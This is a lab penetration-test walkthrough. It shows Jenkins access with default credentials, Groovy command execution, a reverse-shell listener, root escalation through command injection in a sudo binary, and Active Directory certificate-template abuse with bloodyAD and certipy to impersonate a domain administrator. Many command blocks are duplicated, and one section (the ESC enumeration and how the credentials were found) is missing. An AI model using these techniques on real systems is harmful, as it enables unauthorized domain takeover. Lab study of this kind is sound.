Anomaly

Anomaly

Objective

The core objective is to demonstrate the full impact of a successful network intrusion by achieving Domain Administrator privileges over the client's Active Directory environment. The test will simulate a motivated external attacker's progression from an initial foothold to complete administrative control.

Scope

The in-scope assets for this engagement include two critical IP addresses:

  1. A hardened Ubuntu Server (Initial Foothold Target).
  2. The primary Domain Controller (Final Privilege Escalation Target).

It is a critical finding that the Domain Controller is running active Antivirus (AV) software; therefore, this test will specifically involve techniques to bypass or evade the installed AV to successfully compromise the domain and demonstrate the potential for a full domain compromise.

As shown in the image above, there two hosts:

10.0.20.47    Anomaly-DC
10.0.25.166   Anomaly-Web
10.0.20.47    Anomaly-DC
10.0.25.166   Anomaly-Web

Assessment

I started the assessment by storing the IP addresses of the hosts inside a file called ips.txt on my machine:

┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ cat ips.txt   
10.0.20.47
10.0.25.166
┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ cat ips.txt   
10.0.20.47
10.0.25.166

While waiting for the result of TCP port scan against the two hosts, I decided to run NetExec against the domain controller. Then I obtained the following information:

┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ nxc smb 10.0.20.47 
SMB         10.0.20.47      445    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 x64 (name:ANOMALY-DC) (domain:anomaly.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ nxc smb 10.0.20.47 
SMB         10.0.20.47      445    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 x64 (name:ANOMALY-DC) (domain:anomaly.hsm) (signing:True) (SMBv1:None) (Null Auth:True)

As shown in the output above, the domain name is anomaly.hsm. I tried to enumerate the domain controller but I had no luck. Time to focus on the other host which is the web server.

From the output above, the domain controller looks like it is exposing default ports. However, the web server is exposing Jenkins on port 8080 due to the tag Jetty(10.0.20).

I browsed to the port 8080 on the web server and noticed it is indeed running Jenkins instance:

However, I do not have any credentials.

When trying the default credentials admin:admin, I successfully gained access to the Jenkins instance on the web server as the admin user:

The easiest way to achieve RCE is by using the script console on Jenkins. Using this script console feature, we can execute Groovy scripts.

Just to test remote code execution on the web server, I ran the following Groovy script which just executes the command id:

def cmd = "id".execute();
println("${cmd.text}");
def cmd = "id".execute();
println("${cmd.text}");

As shown in the image below, we successfully get the output of the command id:

Time to obtain a reverse shell connection.

Using the website revshells.com, I generated a Groovy reverse shell first by selecting the shell as bash:

Then on my machine, I started a listener on port 443:

┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ nc -lvnp 443                                         
listening on [any] 443 ...
┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ nc -lvnp 443                                         
listening on [any] 443 ...

I pasted the reverse shell inside the script console window. Then I pressed the Run button. And immediately I obtained a reverse shell connection:

To obtain an interactive bash shell, I used python's pty module:

python3 -c 'import pty; pty.spawn("/bin/bash");'
python3 -c 'import pty; pty.spawn("/bin/bash");'

When checking what commands this user can execute with other privileges, I get the following:

jenkins@ip-10-0-25-166:/home$ sudo -l
sudo -l
Matching Defaults entries for jenkins on ip-10-0-25-166:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jenkins may run the following commands on ip-10-0-25-166:
    (ALL) NOPASSWD: /usr/bin/router_config

jenkins@ip-10-0-25-166:/home$ sudo -l
sudo -l
Matching Defaults entries for jenkins on ip-10-0-25-166:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jenkins may run the following commands on ip-10-0-25-166:
    (ALL) NOPASSWD: /usr/bin/router_config

I notice our user jenkins can execute the binary router_config.

When trying to run this binary, I notice a configuration file must be passed:

jenkins@ip-10-0-25-166:/home$ sudo -u root /usr/bin/router_config
sudo -u root /usr/bin/router_config
Welcome to Router Configuration Utility v1.2
Usage: /usr/bin/router_config <config_file>
jenkins@ip-10-0-25-166:/home$ sudo -u root /usr/bin/router_config
sudo -u root /usr/bin/router_config
Welcome to Router Configuration Utility v1.2
Usage: /usr/bin/router_config <config_file>

The binary is seriously vulnerable to Command Injection. It does not perform thorough checks against the passed router configuration file. I managed to inject the command whoami after the binary name to get root output:

jenkins@ip-10-0-25-166:/tmp$ sudo -u root /usr/bin/router_config whoami       
sudo -u root /usr/bin/router_config whoami
Welcome to Router Configuration Utility v1.2
Applying configuration...
Applying config from whoami
root
Configuration applied successfully!
jenkins@ip-10-0-25-166:/tmp$ sudo -u root /usr/bin/router_config whoami       
sudo -u root /usr/bin/router_config whoami
Welcome to Router Configuration Utility v1.2
Applying configuration...
Applying config from whoami
root
Configuration applied successfully!

Then I opened a bash shell with root privileges by injecting the command bash after the binary name router_config:

jenkins@ip-10-0-25-166:/tmp$ sudo -u root /usr/bin/router_config bash
sudo -u root /usr/bin/router_config bash
Welcome to Router Configuration Utility v1.2
Applying configuration...
Applying config from bash
root@ip-10-0-25-166:/tmp# whoami
whoami
root
root@ip-10-0-25-166:/tmp#
jenkins@ip-10-0-25-166:/tmp$ sudo -u root /usr/bin/router_config bash
sudo -u root /usr/bin/router_config bash
Welcome to Router Configuration Utility v1.2
Applying configuration...
Applying config from bash
root@ip-10-0-25-166:/tmp# whoami
whoami
root
root@ip-10-0-25-166:/tmp#

Now I have a root shell on the machine.

ESC1 allows us to request a template by injecting the username of other user, such as the domain administrator. ESC4 occurs when our user has dangerous privileges over templates. In the output above, ESC4 occurs due to the ANOMALY.HSM\Domain Computers which allows any machine account in the domain to alter this CertAdmin template. However, in this domain there are no other computers (except the web server & domain controller). To overcome this, I used bloodyAD to add a new computer in the domain:

┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ bloodyAD --host Anomaly-DC.anomaly.hsm -d anomaly.hsm -u brandon_boyd -p '3edc4rfv#EDC$RFV' add computer 'Finance' 'Pwned123'
[+] Finance$ create
┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ bloodyAD --host Anomaly-DC.anomaly.hsm -d anomaly.hsm -u brandon_boyd -p '3edc4rfv#EDC$RFV' add computer 'Finance' 'Pwned123'
[+] Finance$ create

After lots of trials and error, I got it to work. I managed to get it to work by targetting the domain administrator user anna_molly as the newly added computer, and also ensuring her RID match with the request:

┌──(kali㉿kali)-[~/Desktop/Labs/Anomaly]
└─$ certipy-ad req -u 'Finance$@anomaly.hsm' -p 'Pwned123' -ca anomaly-ANOMALY-DC-CA-2 -template CertAdmin -upn anna_molly@anomaly.hsm -sid S-1-5-21-1496966362-3320961333-4044918980-1105 -dc-ip 10.0.20.47 -debug -dns 10.0.20.47

Then using the PFX file, I tried to retrieve the NT hash of the anna_molly but it kept on failing. However, I used the LDAP shell, as domain administrator account, to change the password of anna_molly to Pwned123:

└─$ certipy-ad auth -pfx anna_molly_10.pfx -dc-ip 10.0.20.47 -ldap-shell
